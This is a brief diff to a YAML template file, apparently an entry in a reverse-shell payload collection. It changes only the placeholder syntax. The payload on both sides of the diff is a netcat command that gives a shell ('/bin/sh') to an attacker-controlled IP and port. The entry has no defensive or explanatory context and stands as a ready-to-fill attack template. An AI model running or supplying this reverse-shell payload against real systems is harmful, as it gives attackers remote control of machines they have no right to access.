@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  nc -e /bin/sh <%=$(esh variables/attacker_ip)%> <%=$(esh variables/shell_port)%>
+  nc -e /bin/sh {{ attacker_ip }} {{ shell_port }}
